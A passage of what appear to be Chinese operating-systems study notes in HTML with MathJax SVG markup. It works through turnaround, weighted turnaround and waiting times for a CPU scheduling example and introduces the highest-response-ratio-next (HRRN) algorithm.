role="img" focusable="false" viewBox="0 -750 7959 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1467.6,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(1967.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2356.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2801.2,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(3879.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(4268.8,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(4768.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5157.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5602.4,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(6681,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(7070,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(7570,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>7时刻(P2完成)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="11.669ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 5157.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1467.6,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(1967.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2356.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2801.2,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(3879.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(4268.8,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(4768.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>11时刻(P4完成)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.332ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2356.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1467.6,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(1967.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>16时刻(P1完成)</p><p>周转时间 = 作业完成时间 - 作业提交(到达)时间：</p><script type="math/tex; mode=display">P1=16-0=16\\\\P2=7-2=5\\\\P3=5-4=1\\\\P4=11-5=6</script><p>带权周转时间 = 周转时间 / 作业实际运行的时间：</p><script type="math/tex; mode=display">P1=\frac{16}{7}=2.28\\\\P2=\frac{5}{4}=1.25\\\\P3=\frac{1}{1}=1\\\\P4=\frac{6}{4}=1.5</script><p>等待时间 = 周转时间 - 运行时间 - I/O操作的时间(这里为0)：</p><script type="math/tex; mode=display">P1=16-7=9\\\\P2=5-4=1\\\\P3=1-1=0\\\\P4=6-4=2</script><h4 id="2-8-7-3-HRRN-高相应比优先"><a href="#2-8-7-3-HRRN-高相应比优先" class="headerlink" title="2.8.7.3 HRRN(高相应比优先)"></a>2.8.7.3 HRRN(高相应比优先)</h4><p>算法思想：综合考虑作业/进程的等待时间和要求服务的时间</p><p>算法规则：在每次调度时先计算各个作业/进程的响应比，选择响应比最高的作业/进程为其服务</p><script type="math/tex; mode=display">响应比 = \frac{等待时间+要求服务时间}{要求服务时间}</script><p>用于作业 / 进程调度：可用于作业调度，也可用于进程调度</p><p>是否可抢占：非抢占式的算法，因此只有当前运行的作业/进程主动放弃处理机时，才需要调度，才需要计算响应比</p><p>优点：综合考虑了等待时间和运行时间(要求服务时间)；等待时间相同时，要求服务时间短的优先(SJF的优点)；要求服务时间相同时，等待时间长的优先(FCFS的优点)；对于长作业来说，随着等待时间越来越久，其响应比也会越来越大，从而避免了长作业饥饿的问题</p><p>是否会导致饥饿：不会</p><p>例：例题同上，使用高响应比优先算法。</p><p>0时刻：只有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.44ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1078.6 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>到达就绪队列，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.44ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1078.6 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>上处理机</p><p>7时刻(P1主动放弃CPU)：就绪队列中有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex" xmlns="http://www.w3.org/2000/svg" width="27.495ex" height="3.15ex" role="img" focusable="false" viewBox="0 -1047.1 12152.7 1392.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1467.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">响</text></g><g data-mml-node="mi" transform="translate(2367.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">应</text></g><g data-mml-node="mi" transform="translate(3267.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">比</text></g><g data-mml-node="mo" transform="translate(4445.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(5501.1,0)"><g data-mml-node="mrow" transform="translate(220,516.8) scale(0.707)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(2167,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2556,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3334,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mn" transform="translate(1398.7,-345) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><rect width="2911" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(8929.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(9985.7,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(778,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 